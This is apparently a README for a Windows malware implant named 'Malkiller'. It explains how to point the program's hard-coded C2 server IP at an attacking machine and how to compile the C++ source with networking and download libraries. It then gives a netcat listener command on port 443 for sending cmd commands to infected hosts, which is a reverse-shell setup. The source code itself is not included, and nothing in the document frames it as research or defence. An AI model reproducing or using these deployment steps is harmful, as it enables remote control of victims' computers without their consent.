## Malkiller

- Change the C2 Server IP: In the code, find the line std::string c2Server = "192.168.1.100"; and change the IP address to the IP of your attacking machine. 

- Compile it using a command like this (if using MinGW-g++):

```bash
g++ -o malkiller.exe malkiller.cpp -lws2_32 -liphlpapi -lnetapi32 -lshlwapi -lwininet -lurlmon -static
```

- On attacking machine to send the cmd commands:
```bash
nc -nlvp 443
```